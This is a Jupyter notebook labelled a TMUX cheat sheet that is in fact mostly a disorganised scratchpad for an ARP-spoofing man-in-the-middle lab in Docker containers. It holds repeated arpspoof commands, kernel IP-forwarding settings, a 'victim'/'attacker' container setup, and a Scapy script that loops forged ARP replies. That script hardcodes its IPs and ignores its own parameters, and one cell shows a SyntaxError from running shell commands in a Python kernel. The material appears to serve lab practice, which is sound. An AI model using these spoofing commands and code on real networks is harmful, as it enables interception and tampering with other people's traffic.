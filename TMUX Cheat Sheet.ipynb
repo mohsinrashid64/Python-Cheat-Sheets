{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "edd0ce34",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux new-session -s ARP\n",
    "tmux new-window\n",
    "tmux next-window"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "47d96c67",
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (4267321505.py, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  File \u001b[0;32m\"/var/folders/g8/3xhdztt918n5fr0997gcttmr0000gp/T/ipykernel_37192/4267321505.py\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    tmux next-window && arpspoof -i eth0 -t 172.17.0.3 172.17.0.1\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.17.0.3 172.17.0.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b589e129",
   "metadata": {},
   "outputs": [],
   "source": [
    "echo 1 > /proc/sys/net/ipv4/ip_forward\n",
    "\n",
    "echo 1 > /proc/sys/net/ipv6/conf/all/forwarding\n",
    "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d4f0724",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker network ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "760653c3",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89321489",
   "metadata": {},
   "outputs": [],
   "source": [
    "sudo nano /etc/resolv.conf\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3be65c9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "22452c60",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.18.0.3 172.18.0.1\n",
    "tmux next-window && arpspoof -i eth0 -t 172.18.0.1 172.18.0.3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13117cc3",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl www.google.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ce56b0b",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.0.2 172.17.0.1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59472c67",
   "metadata": {},
   "outputs": [],
   "source": [
    "curl -v --dns-servers 8.8.8.8 http://www.google.com/\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd0821a4",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c9b6888",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "38124124",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker network create mbn\n",
    "docker run --network mbn -it --publish 8080:80 --privileged kali-linux\n",
    "docker run --network mbn -it --publish 8081:80 --privileged kali-linux\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47f4c713",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b377777b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f69ab657",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab2fca0c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all as scapy\n",
    "import time\n",
    "\n",
    "def get_mac(ip):\n",
    "    arp_request = scapy.ARP(pdst=ip)\n",
    "    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n",
    "    arp_request_broadcast = broadcast/arp_request\n",
    "    answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]\n",
    "\n",
    "    return answered_list[0][1].hwsrc\n",
    "\n",
    "\n",
    "\n",
    "def spoof(target_ip, spoof_ip):\n",
    "    target_mac=get_mac(target_ip)\n",
    "    packet = scapy.ARP(op=2,pdst=\"172.18.0.3\",hwdst=target_mac,psrc=\"172.18.0.1\")\n",
    "    scapy.send(packet)\n",
    "\n",
    "while True:\n",
    "    spoof(\"172.18.0.3\", \"172.18.0.1\")\n",
    "    spoof(\"172.18.0.1\", \"172.18.0.3\")\n",
    "    time.sleep(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "326130d1",
   "metadata": {},
   "outputs": [],
   "source": [
    "echo http://dl-cdn.alpinelinux.org/alpine/edge/testing >> /etc/apk/repositories\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ade573d7",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0f4c291",
   "metadata": {},
   "outputs": [],
   "source": [
    "apachectl start\n",
    "apachectl stop"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3285d62a",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker run --net=host my_container\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73af5af6",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d446544",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b4f3748",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.17.0.3 172.17.0.1\n",
    "tmux next-window && arpspoof -i docker0 -t 172.17.0.2 172.17.0.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7d34607",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.17.0.2 172.17.0.1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9505987e",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker run -d --name host-container --net none --ip 192.168.1.100/24 alpine sleep infinity\n",
    "docker run -d  --net none --ip 192.168.1.100/24 kali-linux\n",
    "docker run -d  --net none --ip 192.168.1.100/24  --rm kali-linux\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab754139",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "41d27e08",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dcbc227",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker run -d --name my-container --net bridge --subnet 172.25.0.0/16 alpine sleep infinity\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da099b4e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c02e1d7d",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.18.0.3 172.18.0.1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c516860d",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3c836d6",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.2 192.168.65.1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d41ef95",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.3 192.168.65.1\n",
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.1 192.168.65.3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab1d8e39",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.2 192.168.65.1\n",
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.1 192.168.65.2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3bb6a8fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.1 192.168.65.3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a9ab656",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acc37ad3",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker run --privileged -it --network container:attacker --name=victim  kali-linux\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e2a38e4",
   "metadata": {},
   "outputs": [],
   "source": [
    "##########"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e710ccc",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker network create --subnet=172.20.0.0/24 --gateway=172.20.0.1 --ip-range=172.20.0.2/24 my_network\n",
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.1 192.168.65.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cab2a58b",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.20.0.1 172.20.0.3\n",
    "tmux next-window && arpspoof -i eth0 -t 172.20.0.3 172.20.0.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9251a7f",
   "metadata": {},
   "outputs": [],
   "source": [
    "####"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb5b4d8b",
   "metadata": {},
   "outputs": [],
   "source": [
    ".1:tmux next-window && arpspoof -i eth0 -t 172.20.0.1 172.20.0.3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8aad838e",
   "metadata": {},
   "outputs": [],
   "source": [
    "while true; do echo \"HTTP/1.1 200 OK\\n\\nHello, world!\" | nc -l -p 80; done\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4d3835f",
   "metadata": {},
   "outputs": [],
   "source": [
    "service apache2 start\n",
    "\n",
    "http://localhost:8080\n",
    "        \n",
    "        192.168.104"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b01b827",
   "metadata": {},
   "outputs": [],
   "source": [
    "###############################################################"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2751353",
   "metadata": {},
   "outputs": [],
   "source": [
    "alice:  172.19.0.4\n",
    "bob:   172.19.0.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95842f20",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd48d80d",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.2 192.168.65.1\n",
    "tmux next-window && arpspoof -i eth0 -t 192.168.65.1 192.168.65.2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52a912bd",
   "metadata": {},
   "outputs": [],
   "source": [
    "docker run -it --network host-net  kali-linux"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f73a633",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6480e39a",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i docker0 -t 172.18.0.2 172.18.0.1\n",
    "tmux next-window && arpspoof -i docker0 -t 172.18.0.1 172.18.0.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d14d67f",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6cf62b47",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa42bc6d",
   "metadata": {},
   "outputs": [],
   "source": [
    "tmux next-window && arpspoof -i eth0 -t 172.17.0.3 172.17.0.1\n",
    "tmux next-window && arpspoof -i eth0 -t 172.17.0.1 172.17.0.3\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
